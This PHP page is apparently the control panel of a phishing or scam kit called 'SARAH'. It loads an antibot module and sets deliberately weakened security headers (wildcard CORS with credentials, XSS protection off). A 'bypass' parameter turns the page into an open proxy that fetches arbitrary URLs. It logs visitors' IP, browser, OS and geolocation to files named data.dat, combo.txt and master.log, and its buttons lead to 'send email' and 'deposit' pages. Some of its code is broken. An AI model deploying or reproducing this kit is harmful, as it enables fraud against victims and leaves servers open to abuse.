<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "INTERACT WITH YOUR NEIGBORS![OPEN]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}


?><html><head>
	<title>Alien Directory</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style>
		body {
			background-color: #0d0d0d;
			color: white;
			font-family: 'Lucida Sans Unicode', sans-serif;
			margin: 0;
			padding: 0;
		}

		header {
			background-color: #171717;
			box-shadow: 0 4px 4px rgba(0, 0, 0, 0.25);
			padding: 10px;
			text-align: center;
		}

		h1 {
			font-size: 36px;
			margin: 0;
		}

		footer {
			background-color: #171717;
			bottom: 0;
			box-shadow: 0 -4px 4px rgba(0, 0, 0, 0.25);
			padding: 10px;
			position: fixed;
			text-align: center;
			width: 100%;
		}

		nav {
			background-color: #252525;
			border-top: 2px solid #171717;
			padding: 10px;
			position: fixed;
			text-align: center;
			top: 50px;
			width: 100%;
		}

		nav a {
			color: white;
			display: inline-block;
			margin: 10px auto;
			padding: 10px 20px;
			text-decoration: none;
		}

		nav a:hover {
			background-color: #171717;
			box-shadow: 0 2px 2px rgba(0, 0, 0, 0.25);
		}

		.screen {
			background-color: #252525;
			height: calc(100vh - 142px);
			padding: 10px;
			width: 100%;
		}

    .button-row {
	margin: 10px 0;
}

.button {
	background-color: #171717;
	border: none;
	border-radius: 10px;
	box-shadow: 0 2px 2px rgba(0, 0, 0, 0.25);
	color: white;
	cursor: pointer;
	display: block;
	font-size: 24px;
	margin: 10px auto;
	padding: 20px;
	text-align: center;
	width: calc(100% - 20px);
}

    .button-row {
	margin: 10px 0;
}

.button {
	background-color: #171717;
	border: none;
	border-radius: 10px;
	box-shadow: 0 2px 2px rgba(0, 0, 0, 0.25);
	color: white;
	cursor: pointer;
	display: block;
	font-size: 24px;
	margin: 10px auto;
	padding: 20px;
	text-align: center;
	width: calc(100% - 20px);
}

		.logout {
			background-color: #f44336;
			color: white;
			position: fixed;
			right: 10px;
			top: 60px;
			padding: 10px;
			border: none;
			border-radius: 5px;
			box-shadow: 0 2px 2px rgba(0, 0, 0, 0.25);
			cursor: pointer;
		}

		.logout:hover {
			background-color: #d32f2f;
		}

		.logo1 {
			font-size: 48px;
			margin: 10px 0;
			text-align: center;
		}
    .logo {
			font-size: 76px;
			margin: 10px 0;
			text-align: center;
		}
	</style>
</head>
<body>
	<header>
		<div class="logo">👽 SARAH </div>
	</header>


	<div class="screen">
		<div class="button-row">

    <div class="logo1"></div>
	
<a href="/public/GO.php"><button class="button">GOOGLE </button></a>
<a href="/public/deposit/submit1.php"><button class="button">SEND CANCEL</button></a>
<a href="/public/deposit/submit.php"><button class="button">SEND   EMAIL</button></a>
<a href="/public/deposit/manual.php"><button class="button">MANUAL  SEND</button></a>
<a href="/public/deposit/manual2.php"><button class="button">MANUAL CANCEL</button></a>
	
	







</div>
		</div>
	

	<footer>
		<p>FOR EDUCATAIONAL PURPOSES ONLY<a href="#"> RANDOM RYAN</a></p>
	</footer>

	<button class="logout">Log Out</button>

</body></html>